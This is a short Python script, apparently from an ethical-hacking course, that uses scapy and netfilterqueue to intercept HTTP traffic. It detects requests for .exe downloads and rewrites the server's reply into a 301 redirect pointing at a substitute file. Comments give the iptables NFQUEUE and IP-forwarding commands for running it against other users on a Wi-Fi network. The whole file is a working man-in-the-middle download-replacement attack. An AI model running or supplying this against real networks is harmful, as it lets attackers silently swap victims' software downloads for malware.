#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue


ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    # Deleting calculated stats so scapy can calculate for us the correct one after modification
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # Request = DNSRQ , Response = DNSRR , Raw field
    # print(scapy_packet.show())  -  Print the packet on the go, so desired fields can be selected.
    if scapy_packet.haslayer(scapy.Raw):
        # Target specific Field
        if scapy_packet[scapy.TCP].dport ==80:
            # Desired file format
            if ".exe" in scapy_packet[scapy.Raw].load and "www.example.com" not in scapy_packet[scapy.Raw].load:
                print("[+] Download request DETECTED !")
                # ack must be verified to accept handshake
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file...")
                # Edit file / link destination.
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp\n\n")

                packet.set_payload(str(modified_packet))


    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


# For NAT network:
# Required command to hold queue: iptables -I INPUT -j NFQUEUE --queue-num 0
# And also                      iptables -I OUTPUT -j NFQUEUE --queue-num 0
# Reset command: iptables --flush
# OUTPUT / INPUT / FORWARD etc...
# - For Wifi network: first: iptables --flush
# - Then: iptables -I FORWARD -j NFQUEUE --queue-num 0
# - and then: echo 1 > /proc/sys/net/ipv4/ip_forward (Allows packets to flow threw the machine)
